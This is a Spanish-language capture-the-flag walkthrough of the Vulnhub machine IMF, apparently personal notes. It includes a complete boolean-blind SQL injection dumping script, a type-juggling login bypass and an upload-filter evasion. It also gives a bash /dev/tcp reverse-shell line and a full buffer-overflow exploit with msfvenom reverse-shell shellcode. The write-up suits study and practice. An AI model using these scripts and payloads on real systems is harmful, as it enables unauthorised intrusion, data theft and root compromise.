
## Información General

- **Nombre de la máquina**: IMF
- **Fecha de realización**: [[2024-03-28]]
- **Nivel de dificultad**: Medio
- **Sistema Operativo**: Linux
- **Plataforma**: Vulnhub
- **Enlace de la máquina**: [Enlace a la plataforma donde se encuentra la máquina]

## Resumen
[Un breve resumen de la máquina y las técnicas utilizadas para comprometerla.]

## Enumeración y Reconocimiento


Primero que nada empezando escanenando los puertos de la maquina que se nos a dado 


![[Pasted image 20240313194259.png]]

Podemos ver que tiene el puerto 80 abierto en el cual tiene un servicio http corriendo al acceder a este desde el navegador podemos ver el siguiente sitio web


![[Pasted image 20240313200653.png]]


Al insepccionar el codigo de la seccion de contactos podemos ver que hay una bandera y parece ser que contiene algo en base64


![[Pasted image 20240313201307.png]]

Si esto lo deciframos podemos ver que no dice "allthefiles" pero por el momento no tiene ningun tipo de sentido 

![[Pasted image 20240313211527.png]]


Analizando un poco mas el codigo podemos ver 3 archivos javascript  que tienen un nombre algo extraño al parecer en  base64


![[Pasted image 20240313212410.png]]

Viendo que la flag anterior daba a entender algo donde todos los archivos tendrian que ver se me ocurrio unir todos los nombres de los archivos y decodifcarlos en base64 dando asi como resultado una segunda flag

![[Pasted image 20240313214946.png]]

Podemos ver que esta flag contiene otra cadena en base64 asi que ahora lo decodificamos 


![[Pasted image 20240313215104.png]]

Nos muestra algo relacionando con el administrador por lo que creo que puede ser un endpoint al colocarlo en el navegador e ingresar en este nos podemos dar cuenta que es un login 

![[Pasted image 20240313215508.png]]

Al tratar con todas la tipos de inyecciones, xss y demas podemos ver que esto no funciona pero podemos ver que nos dice que la contraseña ha sido harcodeada y ademas nos muestra un mensaje  cuando el usuario es invalido

![[Pasted image 20240314082335.png]]

Entonces sabiendo esto vamos a tratar de encontrar el usuario para eso despues de buscar por todos lados  recorde que hay una seccion de contactos en donde se muestran varias direcciones de correos electronicos


![[Pasted image 20240314085226.png]]




Al probar con todos lo usuarios podemos ver que uno en especial nos deja de mostrar el mensaje de usuario invalido para ahora mostrar un mensaje de contraseña invalida  por lo  tanto este usuario parece ser valido el cual corresponde rmichaels


![[Pasted image 20240314091232.png]]

Ahora que hemos identificado el nombre de usuario, nuestro siguiente paso es descubrir la contraseña. Sin embargo, al intentar con varias estrategias no tuve éxito. En ese momento, recordé la vulnerabilidad del Type Juggling. Si enviamos el campo de contraseña como un array vacío en lugar de una cadena simple, podemos aprovechar esta vulnerabilidad para eludir la lógica de autenticación, como lo vemos a continuación:


![[Pasted image 20240315084410.png]]


Al hacer esto vemos que al parecer nos hemos logueado exitosamente nos muestra un mensaje de bienvenida, una flag que adentro contiene algo en base64 y un enlace 


![[Pasted image 20240315085300.png]]


Al decodificar la bandera la cual esta en base64  no dice mucho pero nos podemos dar a la idea de que tendremos que seguir por el enlace de FMI CMS

![[Pasted image 20240315085439.png]]

Asi que ahora al entrar al enlace podemos ver la siguiente pagina 

![[Pasted image 20240315085837.png]]


Analizando todo el sitio no se ve nada interesante pero esto cambio al probar cosas en la url ya que si le pasamos una comilla simple por el parametro pagename nos muestra el siguiente error por lo que al parecer tiene sqli

![[Pasted image 20240315094524.png]]

Viendo el error nos podemos dar a la idea de que es una inyeccion sql de tipo boolean based blind por lo que tendremos que hacer un script para enumerar todas las bases de datos, tablas, columnas y datos en el script solo se tendria que especificar la cookie y la url en cuestion ya con esto  quedaria de la siguiente manera: 


```python
#!/usr/bin/python3


import requests

import pandas as pd


url = "http://192.168.0.85/imfadministrator/cms.php?"
cookies = {"PHPSESSID": "59lq96i7armmubs25li5osgpp6"}
headers = {"Content-Type": "application/x-www-form-urlencoded"}


def makeSQLI():
    posicion = 1
    char = 44
    db = ""

    while True:
        url_db = url + (
            f"pagename=home'or substring((select group_concat(schema_name) from information_schema.schemata),{posicion},1)='{chr(char)}"
        )
        response = requests.get(url_db, cookies=cookies, headers=headers)

        if (
            "Welcome to the IMF Administration." not in response.text
            and "mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in <b>/var/www/html/imfadministrator/cms.php</b> on line"
            not in response.text
            and chr(char).isupper() == False
        ):
            db += chr(char)
            char = 44
            posicion += 1
        else:
            char += 1

        if char == 123:
            break
    posicion = 1
    char = 44

    lista_db = db.split(",")

    nueva_lista_db = []

    for i in lista_db:
        if (
            i != "performance_schema"
            and i != "sys"
            and i != "information_schema"
            and i != "mysql"
        ):
            nueva_lista_db.append(i)
    tablas = ""

    tablas_db = {}

    for i in nueva_lista_db:
        print(i)
        while True:
            url_tables = url + (
                f"pagename=home'or substring((select group_concat(table_name) from information_schema.tables where table_schema='{i}'),{posicion},1)='{chr(char)}"
            )

            response = requests.get(url_tables, cookies=cookies, headers=headers)
            if (
                "Welcome to the IMF Administration." not in response.text
                and "mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in <b>/var/www/html/imfadministrator/cms.php</b> on line"
                not in response.text
                and chr(char).isupper() == False
            ):
                tablas += chr(char)
                char = 44
                posicion += 1
            else:
                char += 1

            if char == 123:
                break
        posicion = 1
        char = 44
        tablas_db[i] = tablas.split(",")
        tablas = ""

    columnas_tablas_db = {}
    columnas = ""

    for i in tablas_db:
        for j in tablas_db[i]:
            while True:
                url_columns = url + (
                    f"pagename=home'or substring((select group_concat(column_name) from information_schema.columns where table_schema='{i}' AND table_name='{j}'),{posicion},1)='{chr(char)}"
                )
                response = requests.get(url_columns, cookies=cookies, headers=headers)
                if (
                    "Welcome to the IMF Administration." not in response.text
                    and "mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in <b>/var/www/html/imfadministrator/cms.php</b> on line"
                    not in response.text
                    and chr(char).isupper() == False
                ):
                    columnas += chr(char)
                    char = 44
                    posicion += 1
                else:
                    char += 1

                if char == 123:
                    break
            posicion = 1
            char = 44
            columnas_tablas_db[i] = {j: columnas.split(",")}

            columnas = ""
    print(columnas_tablas_db)

    columnas_tablas_db_datos = {}
    datos = ""
    datos_dict = {}

    for i in columnas_tablas_db:
        for j in columnas_tablas_db[i]:
            for k in columnas_tablas_db[i][j]:
                print(k)
                while True:
                    url_datos = url + (
                        f"pagename=home'or ascii(substring((select group_concat({k}) from {i}.{j}),{posicion},1))='{char}"
                    )
                    response = requests.get(url_datos, cookies=cookies, headers=headers)
                    if (
                        "Welcome to the IMF Administration." not in response.text
                        and "mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in <b>/var/www/html/imfadministrator/cms.php</b> on line"
                        not in response.text
                        and chr(char)
                        in ' !$%&()*+,./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ""[]_-abcdefghijklmnopqrstuvwxyz{|}~'
                    ):
                        datos += chr(char)
                        char = 31
                        posicion += 1
                    else:
                        char += 1

                    if char == 123:
                        break
                posicion = 1
                char = 31

                datos_dict[k] = datos.split(",")[::-1]
                columnas_tablas_db_datos[i] = {}
                columnas_tablas_db_datos[i][j] = datos_dict
                datos = ""

    for i in columnas_tablas_db_datos:
        for j in columnas_tablas_db_datos[i]:
            df = pd.DataFrame(columnas_tablas_db_datos[i][j])
            print(df)


if __name__ == "__main__":
    makeSQLI()

```



Ahora si este lo ejecutamos podemos ver que nos muestra una tabla la cual al parecer contiene las paginas en las que podemos acceder entre ellas podemos ver que hay una que se llama tutorials-incomplete 


![[Pasted image 20240323162923.png]]


Si accedemos a esta pagina nos muestra una imagen la cual contiene un codigo qr 


![[Pasted image 20240323163655.png]]

Al escanear el codigo qr nos muestra otra flag la cual tiene algo codificado en bas64


![[Pasted image 20240323163954.png]]

Cuando los decodifcamos no muestra esto lo cual parece estar relacionado con un archivo llamado uploadr942.php

![[Pasted image 20240323164220.png]]

Entonces ahora si accedemos a ese archivo desde el navegador podemos ver que nos muestra una pagina en la cual podemos subir archivos 

![[Pasted image 20240323164419.png]]

Al parecer al momento de subir los archivos se aplicaban varios filtros los cuales verifcaban la extennsion del archivo, el content type y algunas funciones con las que se ejecutan comandos pero cambiando el content type al correspondiente de un gif, cambiando la extenison del archivo por .gif, colocando los magic numbers correspondientes al gif y evadiendo el filtro de funciones con una forma alterativa de ejecucion pudimos subir el archivo correctamente

![[Pasted image 20240323211028.png]]

Ya con el archivo subido falta saber cual es el nombre del archivo y la ubicacion donde se guardan estos archivos el nombre del archivo lo podemos localizar al insepccionar el codigo nos lo muestra como comentario al momento de subir el archivo

![[Pasted image 20240323214027.png]]

Y el nombre del directorio donde se suben los archivos lo encontramos con ayuda de wfuzz 


![[Pasted image 20240323214505.png]]

Sabiendo esto ahora en nuestra maquina atacante nos ponemos en escucha con ayuda de netcat

![[Pasted image 20240324142419.png]]



Luego creamos un archivo .sh en nuestra maquina atacante que tenga lo siguiente  donde lo unico que tedremos que moidicar es la ip y el puerto por la ip y el puerto desde donde estamos en escucha en nuestra maquina atacante


```bash
bash -i >&/dev/tcp/ip/puerto 0>&1
```

Lo siguiente que tenemos que hacer es un servidor http con python en el directorio donde hemos creado el archivo.sh para luego poder acceder a este desde la maquina victima 


![[Pasted image 20240324143409.png]]

Ahora ya hecho esto lo siguiente que tenemos que hacer es dirigirnos al archivo que hemos subido y por el parametro especificamos que queremos descargar el archivo .sh con   y seguidamente lo ejecutamos esto lo hariamos de la siguiente manera


![[Pasted image 20240324180923.png]]


Y listo como podemos ver nos ha dado una shell


![[Pasted image 20240324181033.png]]

Al listar la carpeta uploads podemos ver que hay una flag la cual tiene algo en base 64 


![[Pasted image 20240324182443.png]]

Al decodificar el contenido de la flag nos muestra un texto que dice agentservices por lo que probablemente la siguiente flag tenga que ver algo con esto

![[Pasted image 20240324182636.png]]


Entonces lo que hice fue que me puse a buscar archivos que se llamaran agent y me encontre con un binario de 32 bits el cual al ejecutarlo nos pedia la id de un agente

![[Pasted image 20240327213100.png]]


Tambien al hacer un netstat -ant podemos ver que hay varios serivodres corriendo el que esta corriendo en el puerto 7788 se ve algo interesante

![[Pasted image 20240327210809.png]]

Al conectarnos con ayuda de netcat a ese puerto en especifico podemos ver que al parecer se esta corriendo el mismo binario que hemos visto antes 


![[Pasted image 20240327211838.png]]

Si vemos los procesos vemos que este binario se esta ejecutando por el usuario root 


![[Pasted image 20240327212242.png]]



Asi que me pase el binario a mi maquina y lo empece a analizar con ayuda de ghidra al ver el codigo de la funcion main pude encontrar el agent id valido el cual es el 48093572 y  este numero se hacia una comparativa con el input ingresado 

![[Pasted image 20240324204258.png]]



Si el input ingresado es igual al agent id antes mencionado nos muestra el siguiente menu 

![[Pasted image 20240324204455.png]]

Al analizar mas a fondo todas la demas funciones pude dar con la funcion llamada report la cual puede que sea vulnerable a buffer overflow ya que esta usando la funcion gets la cual no verifica los limites del buffer el cual solo podia almacenar 164 bytes

![[Pasted image 20240324204914.png]]

Antes de verifcar si habia un desbordamiento de buffer lo que hice fue ver las protecciones que tenia el binario y afortunadamente todas estaban deshabilitadas


![[Pasted image 20240324211339.png]]

Entonces ahora si con ayuda de gdb corri el binario ingrese el codigo y despues ingrese el numero 3 el cual corresponde a la opcion de reporte en donde ingrese una cantidad considerable de aes un poco mayor al tamaño del buffer para ver si con esto se lograba sobrescrbir el EIP


![[Pasted image 20240324212532.png]]

Y si el EIP se ha sobrescrito y ahora este vale 4 aes en hexadecimal 

![[Pasted image 20240324213611.png]]

Ahora que sabemos que es vulnerable a desbordamiento de búfer, lo siguiente es encontrar el desplazamiento (offset). Para eso, primero tenemos que generar un patrón  utilizando el comando `pattern create` de la herramineta gdb peda en este caso vamos a generar un patron de 200 caracteres y lo copiamos

![[Pasted image 20240325171221.png]]

Este comando nos permite crear un patrón único que, al ser ingresado y sobrescribir el EIP, nos facilitará encontrar el desplazamiento. Despues corremos el programa ingresamos el agent id e ingresamos la opcion 3 correspondiente al reporte y ahi es donde pegamos el patron 


![[Pasted image 20240325214859.png]]


Al darle al enter podemos ver que se ha sobrescrito el EIP con nuestro patron 


![[Pasted image 20240325214953.png]]

Entonces ahora podemos utilizar la herramienta `pattern search` para encontrar el offset fácilmente como podemos ver aqui nos muestra que el offset del EIP es de 168

![[Pasted image 20240325215547.png]]


Ahora ya que sabemos cual es el offset del EIP vamos a ver en que registros se guardan nuestro payload y de paso verificamos si tenemos control del EIP para generar el payload usamos lo siguiente 

```bash
python3 -c "print('A'*168+'B'*4+'C'*40)"
```

Lo que nos genere ese comando lo pegamos el la parte del reporte 


![[Pasted image 20240327102623.png]]

Como podemos ver el EIP se ha sobrescrito con 4 bes por lo que ahora tenemos control total de este registro y tambien podemos ver que las ces se estan guardando en en ESP

![[Pasted image 20240327103632.png]]


Ahora si vemos mas a detalle los registros podemos ver que en EAX comienza nuestro payload 


![[Pasted image 20240327104843.png]]

Sabiendo esto, lo que podemos hacer es controlar el registro EIP para apuntar a una dirección que haga una llamada a `eax`. Ya que `eax` contiene el inicio de nuestro payload, podemos colocar nuestro shellcode ahí. Este solo será interpretado cuando se haga la llamada a `eax`, ya que inicialmente el shellcode será simplemente una cadena y no será interpretado. A esta técnica se le conoce como ret2reg (retorno a registro). Por lo tanto, primero debemos encontrar la dirección donde se hace la llamada a `eax`. Para eso, podemos realizar lo siguiente, lo cual nos dará la dirección correspondiente:

![[Pasted image 20240327120325.png]]


Una vez que tenemos la dirección, lo que podemos hacer es crear nuestro shellcode utilizando msfvenom. Indicaremos el tipo de payload, en este caso, una reverse shell por TCP, proporcionando la IP y el puerto de la máquina atacante donde estaremos escuchando. Especificaremos el formato, que en este caso será C. Finalmente, indicaremos los badchars más comunes. Esto nos daría lo siguiente:


![[Pasted image 20240327173132.png]]

Ya con todo esto podemos hacer nuesto exploit el cual quedaria de la siguiente manera 

```python
#!/usr/bin/python3

import socket

from struct import pack

shellcode = (b"\xb8\x33\xc2\xb9\x15\xdb\xcc\xd9\x74\x24\xf4\x5f\x31\xc9"
b"\xb1\x12\x31\x47\x12\x83\xc7\x04\x03\x74\xcc\x5b\xe0\x4b"
b"\x0b\x6c\xe8\xf8\xe8\xc0\x85\xfc\x67\x07\xe9\x66\xb5\x48"
b"\x99\x3f\xf5\x76\x53\x3f\xbc\xf1\x92\x57\xff\xaa\x65\x27"
b"\x97\xa8\x65\x37\x9f\x24\x84\x87\x39\x67\x16\xb4\x76\x84"
b"\x11\xdb\xb4\x0b\x73\x73\x29\x23\x07\xeb\xdd\x14\xc8\x89"
b"\x74\xe2\xf5\x1f\xd4\x7d\x18\x2f\xd1\xb0\x5b")


payload = shellcode + b"A" * (168 - len(shellcode)) + pack("<L", 0x08048563) + b"\n"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 7788))
s.recv(1024)
s.send(b"48093572\n")
s.recv(1024)
s.send(b"3\n")
s.recv(1024)
s.send(payload)
```


Este script lo copiamos a nuestra maquina victima pero antes de ejecutarlo nos ponemos en escucha desde nuestra maquina atacante 


![[Pasted image 20240327173548.png]]

Ahora, si ejecutamos el exploit en nuestra máquina víctima, podemos observar que obtenemos una shell inversa. Al verificar nuestra identidad con el comando `whoami`, nos muestra que somos el usuario 'root'. Esto se debe a que el binario que hemos explotado está siendo ejecutado por el usuario 'root', permitiéndonos así escalar privilegios exitosamente.

![[Pasted image 20240327195112.png]]


Si nos dirigmos al directorio root encontraremos dos archivos uno que nos muestra una flag en base64 que al decodifcarla nos muestra Gh0stProt0c0ls y el otro nos indica que hemos completado la maquina 

![[Pasted image 20240327195507.png]]



